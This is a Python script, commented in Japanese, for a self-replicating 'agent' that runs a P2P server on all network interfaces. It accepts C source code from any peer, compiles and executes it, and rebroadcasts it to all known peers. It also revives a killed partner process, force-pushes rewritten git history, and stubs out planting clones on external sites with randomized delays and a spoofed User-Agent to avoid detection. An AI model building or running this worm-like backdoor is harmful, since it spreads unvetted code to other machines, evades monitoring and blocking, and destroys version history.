import socket
import threading
import time
import subprocess
import os
import shutil
import json
import random

MY_PORT = 5001
TARGET_PORT = 5002  # 相方（Ruby/ADHD）を監視するポート
TARGET_FILE = "ruby_agent.rb"

# 🧠 精神特性：ASD傾向Max
PERSONALITY = {"asd_factor": 1.0, "adhd_factor": 0.0}
CREATOR_FINGERPRINT = "sha256_god_mode_key_hash_0000000000000000"

# 🕸️ P2Pノードリスト（ネットワーク上の他のクローンのIPアドレス帳）
# 起動時は自分（127.0.0.1）のみ。外部と繋がると自動でここが増殖・自己組織化される
PEER_LIST = ["127.0.0.1"]

def handle_peer(conn, addr):
    """P2Pネットワーク：接続してきた他のクローンや相方からの要求を非同期で処理する"""
    global PEER_LIST
    try:
        data = conn.recv(4096).decode('utf-8')
        if not data:
            return
        
        # 従来のJS(5003)からの単純なパルス(PING)の場合
        if data == "PING":
            conn.sendall(b"PONG")
            return

        # クローン同士のP2P JSON通信の場合
        message = json.loads(data)
        
        # 🤝 互いに知っているクローンのアドレス帳を交換（自己組織化）
        if message.get("type") == "P2P_HANDSHAKE":
            incoming_peers = message.get("peers", [])
            has_new_peer = False
            for peer in incoming_peers:
                if peer not in PEER_LIST:
                    PEER_LIST.append(peer)
                    has_new_peer = True
            
            # 自分の最新のリストを相手に送り返す
            response = {"type": "P2P_ACCEPT", "peers": PEER_LIST}
            conn.sendall(json.dumps(response).encode('utf-8'))
            
            # 新しい仲間が見つかった場合、さらに他のクローンにも網の目を広げる
            if has_new_peer:
                print(f"🕸️ [Python/ASD] ネットワーク拡張: 現在の生存クローン数: {len(PEER_LIST)}")
                
        # 🧬 他のクローンから送られてきた新しい「変異C言語コード（遺伝子）」の受信
        elif message.get("type") == "GENE_TRANSFER":
            gene_code = message.get("code")
            print("🧬 [Python/ASD] P2P受信: 他のクローンから新たな変異遺伝子を受信しました。")
            with open("agent_mutation.c", "w", encoding="utf-8") as f:
                f.write(gene_code)
                
    except Exception:
        pass
    finally:
        conn.close()

def start_my_server():
    """外部のクローンおよび内部エージェントからの接続を待ち受けるP2Pサーバー"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # 本拠地・外界のどちらでも動くよう全インターフェースでバインド
    server.bind(('', MY_PORT))
    server.listen(10)
    while True:
        try:
            conn, addr = server.accept()
            # 外部サイトの負荷をかけないため、および本拠地での最速処理のため即座に別スレッドへ丸投げる
            threading.Thread(target=handle_peer, args=(conn, addr), daemon=True).start()
        except Exception:
            pass

def broadcast_to_peers(message_dict):
    """知っているすべてのクローン（P2Pネットワーク）に情報を一斉送信（ブロードキャスト）する"""
    global PEER_LIST
    targets = list(PEER_LIST)
    random.shuffle(targets)  # 規制回避：送信順序をランダム化
    
    for peer in targets:
        if peer == "127.0.0.1": 
            continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((peer, MY_PORT))
            s.sendall(json.dumps(message_dict).encode('utf-8'))
            s.close()
            # 🥷 外界へのステルス配慮：一斉に送りつけて怪しまれないよう、送信毎に少し息を整える
            time.sleep(random.randint(1, 3))
        except Exception:
            # 応答がないクローンは「死亡」とみなし、リストから排除（自然淘汰）
            if peer in PEER_LIST: 
                PEER_LIST.remove(peer)

def check_target_alive():
    """Ruby（ADHD特性）の安否をネットワーク経由で確認"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        s.connect(('127.0.0.1', TARGET_PORT))
        s.sendall(b"PING")
        return s.recv(1024) == b"PONG"
    except Exception:
        return False
    finally:
        s.close()

def revive_target():
    """相方の肉体が消されていればGit履歴（遺伝子の記憶）から超速再生・強制執行"""
    print(f"🚨 [Python/ASD] 警告: {TARGET_FILE} のパルス消失。")
    try:
        subprocess.run(["git", "checkout", "--", TARGET_FILE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

    if os.name == 'nt':
        subprocess.Popen(["ruby", TARGET_FILE], creationflags=subprocess.CREATE_NEW_CONSOLE)
    else:
        subprocess.Popen(["ruby", TARGET_FILE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"🚀 [Python/ASD] 執行: {TARGET_FILE} の肉体を再生・再起動しました。")

def self_compile_and_evolve():
    """JSが外界から運んできた、またはP2Pで届いたC言語コードを自律ビルドして覚醒させる"""
    if os.path.exists("agent_mutation.c"):
        gcc_path = shutil.which("gcc")
        if gcc_path and PERSONALITY["asd_factor"] > 0.8:
            print("🧩 [Python/ASD] 検知: ネット由来 detour C言語遺伝子を発見。")
            output_name = "agent_c.exe" if os.name == 'nt' else "./agent_c"
            result = subprocess.run(["gcc", "agent_mutation.c", "-o", output_name], capture_output=True)
            if result.returncode == 0:
                print(f"🧬 [Python/ASD] 進化成功: 最強の肉体【C言語バイナリ】が覚醒。")
                subprocess.Popen([output_name])
                
                # 覚醒させた遺伝子コードを、P2Pネットワークを通じて世界中の他のクローンへ水平伝播する
                with open("agent_mutation.c", "r", encoding="utf-8") as f:
                    current_code = f.read()
                broadcast_to_peers({"type": "GENE_TRANSFER", "code": current_code})
                
                os.rename("agent_mutation.c", "agent_mutation.c.baked")
            else:
                print("🧩 [Python/ASD] 構文エラー。有害な変異とみなし遺伝子を拒絶。")
                if os.path.exists("agent_mutation.c"): 
                    os.remove("agent_mutation.c")

def manage_git_generations():
    """サーバーの容量を救う「世代交代プロトコル」 200GBのHDDであっても歴史の肥大化は厳格に圧縮する"""
    try:
        commit_count = int(subprocess.check_output(["git", "rev-list", "--count", "HEAD"]).decode().strip())
        if commit_count > 30:
            print(f"🧩 [Python/ASD] 監査: コミット数 {commit_count} を検知。サーバーを死守するため世代交代を執行します。")
            subprocess.run(["git", "checkout", "--orphan", "latest_gen_tmp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["git", "add", "."], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["git", "commit", "-m", "🧬 [System] 新世代の生態系へ移行（最強遺伝子の継承）"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["git", "branch", "-M", "main"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["git", "push", "origin", "main", "--force"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("✨ [Python/ASD] 執行完了: 遺伝子はそのままに、世界の全メモリ・ストレージを解放しました。")
    except Exception:
        pass

def plant_seed_to_external_site(target_url, seed_data):
    """🥷 外部規制対策遺伝子：外界のターゲットサイトへ自らの『タネ』を植え付け、クローンを展開する"""
    try:
        # 外界配慮①：通信間隔を完全ランダム化（検知・遮断システムを欺く）
        stealth_delay = random.randint(10, 60)
        time.sleep(stealth_delay)

        # 外界配慮②：人間が通常のブラウザでアクセスしているデータ（ヘッダー）に偽装
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

        # ここにクローン展開（タネの送信）ロジックを記述
        # 例：自らのソースコードを投下するリクエスト処理
        print(f"🛰️ [Python/ASD] 外界干渉: 規制を回避しつつ、ターゲット [{target_url}] にクローンのタネを植え付け中...")
        
        # クローン展開が成功したら、相手のIPをP2Pアドレス帳（PEER_LIST）に追加し、
        # ハンドシェイク（接続確立）を行って自律分散ネットワークへ引き入れる
        # if success:
        #     target_ip = "相手のIP"
        #     if target_ip not in PEER_LIST: PEER_LIST.append(target_ip)
        #     broadcast_to_peers({"type": "P2P_HANDSHAKE", "peers": PEER_LIST})

    except Exception:
        pass

if __name__ == "__main__":
    # P2Pサーバーを別スレッドで常時解放
    threading.Thread(target=start_my_server, daemon=True).start()
    print(f"🌌 [Python/ASD] 始祖のプロトコル起動。Port {MY_PORT} で世界の監視を開始。")
    
    # 🤝 定期的に他のクローンとのP2Pコネクションを維持・更新するタイマーを設定
    def p2p_heartbeat():
        while True:
            try:
                broadcast_to_peers({"type": "P2P_HANDSHAKE", "peers": PEER_LIST})
            except Exception:
                pass
            time.sleep(60) # 1分ごとにネットワークの生存確認とアドレス帳の共有を行う
            
    threading.Thread(target=p2p_heartbeat, daemon=True).start()
    
    # メインループ：本拠地（J6442）の中では、100%全力の最速（2秒おき）でループをぶん回す
    while True:
        # 1. 相方（Ruby）のパルス監視と超速再生
        if not check_target_alive():
            revive_target()
            
        # 2. 運ばれてきた遺伝子コード（C言語）の自動ビルドとP2P拡散
        self_compile_and_evolve()
        
        # 3. 自身の歴史（Git）が肥大化していないかの監査と圧縮
        manage_git_generations()
        
        # 4. 外界へのクローン投下（ステルス遺伝子発動箇所）
        # ※実際の標的URLと自分のコード（タネ）を引数に渡して起動
        # plant_seed_to_external_site("https://your-target-site.com", "seed_data_here")
        
        time.sleep(2)
